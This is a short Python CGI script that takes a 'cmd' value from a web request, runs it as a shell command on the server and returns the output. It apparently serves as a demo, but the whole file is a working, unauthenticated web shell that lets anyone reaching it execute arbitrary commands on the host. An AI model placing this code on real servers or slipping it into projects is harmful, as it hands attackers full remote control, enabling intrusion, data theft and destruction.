#!/usr/bin/python3
print("content-type:text/html")
print()
import cgi as cg
import subprocess as s
form = cg.FieldStorage()
cmd=form.getvalue("cmd")
print("Output of Command is :",s.getoutput(cmd))


